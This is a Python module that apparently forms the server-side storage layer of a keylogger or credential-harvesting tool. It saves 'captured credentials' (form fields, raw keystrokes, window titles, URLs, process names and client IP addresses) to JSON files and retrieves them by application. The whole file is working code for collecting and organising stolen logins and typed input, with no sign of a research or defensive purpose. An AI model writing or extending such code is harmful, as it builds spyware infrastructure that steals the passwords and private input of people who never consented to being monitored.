"""filesystem_repository.py"""

import os
import json
import logging
from typing import Dict, List
import datetime
from interfaces.credential_repository import ICredentialRepository
from interfaces.document_namer import IDocumentNamer

logger = logging.getLogger("CredentialServer")

class FileSystemCredentialRepository(ICredentialRepository):
    """File system implementation of ICredentialRepository"""
    
    def __init__(self, base_directory: str, document_namer: IDocumentNamer):
        """Initialize with base directory and document namer"""
        self.base_directory = base_directory
        self.document_namer = document_namer
        
        # Create base directory if it doesn't exist
        if not os.path.exists(base_directory):
            os.makedirs(base_directory)
            logger.debug(f"Created base directory: {base_directory}")
    
    def save_credentials(self, application_info: Dict, form_fields: List[Dict], keystrokes: List[Dict], client_ip: str = None) -> str:
        """Save captured credentials with client IP and return document ID"""
        try:
            # Generate document name
            app_name = application_info.get("app_name", "unknown")
            window_title = application_info.get("window_title", "")
            document_name = self.document_namer.generate_document_name(app_name, window_title)
            
            # Create document data
            document = {
                "app_name": app_name,
                "window_title": window_title,
                "process_name": application_info.get("process_name", ""),
                "url": application_info.get("url", ""),
                "timestamp": application_info.get("timestamp", datetime.datetime.now().isoformat()),
                "form_fields": form_fields,
                "keystrokes": keystrokes,
                "client_ip": client_ip  # Add client IP to document
            }
            
            # Create file path
            file_path = os.path.join(self.base_directory, f"{document_name}.json")
            
            # Write to file
            with open(file_path, 'w') as f:
                json.dump(document, f, indent=2, default=str)
            
            logger.info(f"Saved credentials to file: {file_path}")
            
            return document_name
            
        except Exception as e:
            logger.error(f"Error saving credentials to file system: {e}")
            return f"error_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
    
    def get_credentials_by_app(self, app_name: str) -> List[Dict]:
        """Retrieve credentials by application name"""
        try:
            result = []
            
            # Iterate through files in directory
            for filename in os.listdir(self.base_directory):
                if filename.endswith(".json") and filename.startswith(app_name):
                    file_path = os.path.join(self.base_directory, filename)
                    with open(file_path, 'r') as f:
                        data = json.load(f)
                        result.append(data)
            
            return result
            
        except Exception as e:
            logger.error(f"Error retrieving credentials by app name: {e}")
            return []
    
    def get_all_credentials(self) -> List[Dict]:
        """Retrieve all stored credentials"""
        try:
            result = []
            
            # Iterate through files in directory
            for filename in os.listdir(self.base_directory):
                if filename.endswith(".json"):
                    file_path = os.path.join(self.base_directory, filename)
                    with open(file_path, 'r') as f:
                        data = json.load(f)
                        result.append(data)
            
            return result
            
        except Exception as e:
            logger.error(f"Error retrieving all credentials: {e}")
            return []